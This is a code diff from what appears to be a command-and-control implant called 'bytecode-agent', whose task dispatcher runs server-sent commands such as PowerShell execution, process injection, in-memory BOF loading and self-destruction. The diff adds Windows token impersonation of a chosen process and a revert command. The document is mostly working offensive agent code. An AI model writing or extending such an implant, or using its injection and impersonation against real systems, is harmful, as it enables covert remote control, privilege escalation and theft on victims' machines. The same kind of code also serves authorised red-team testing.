@@ -13,6 +13,7 @@ import (
 	"bytecode-agent/internal/comms"
 	"bytecode-agent/internal/identity"
 	"bytecode-agent/internal/loader"
+	"bytecode-agent/internal/windows"
 )
 
 // MaxOutputSize limits the output size sent back to the server
@@ -80,7 +81,7 @@ func Execute(task *comms.TaskPayload, apiKey string) *comms.ResultRequest {
 	case "self_destruct":
 		output, err = selfDestruct()
 	case "getprivs":
-		output, err = getPrivileges()
+		output, err = windows.GetCurrentPrivileges()
 	case "getenv":
 		output, err = getEnvironment()
 	case "powershell":
@@ -91,6 +92,10 @@ func Execute(task *comms.TaskPayload, apiKey string) *comms.ResultRequest {
 		output, err = handleInjection(task.Payload)
 	case "bof_run":
 		output, err = handleBOFRun(task.Payload)
+	case "impersonate":
+		output, err = handleImpersonate(task.Payload)
+	case "revert_self":
+		output, err = windows.RevertToSelf()
 	default:
 		err = fmt.Errorf("unknown task type: %s", task.Type)
 	}
@@ -251,4 +256,19 @@ func handleBOFRun(payload interface{}) (string, error) {
 	}
 
 	return loader.RunBOF(data, entryName)
+}
+
+// handleImpersonate handles token impersonation
+func handleImpersonate(payload interface{}) (string, error) {
+	payloadMap, ok := toMap(payload)
+	if !ok {
+		return "", fmt.Errorf("invalid payload: expected object")
+	}
+
+	pidFloat, ok := payloadMap["pid"].(float64)
+	if !ok {
+		return "", fmt.Errorf("missing or invalid pid in payload")
+	}
+
+	return windows.ImpersonateProcess(uint32(pidFloat))
 }
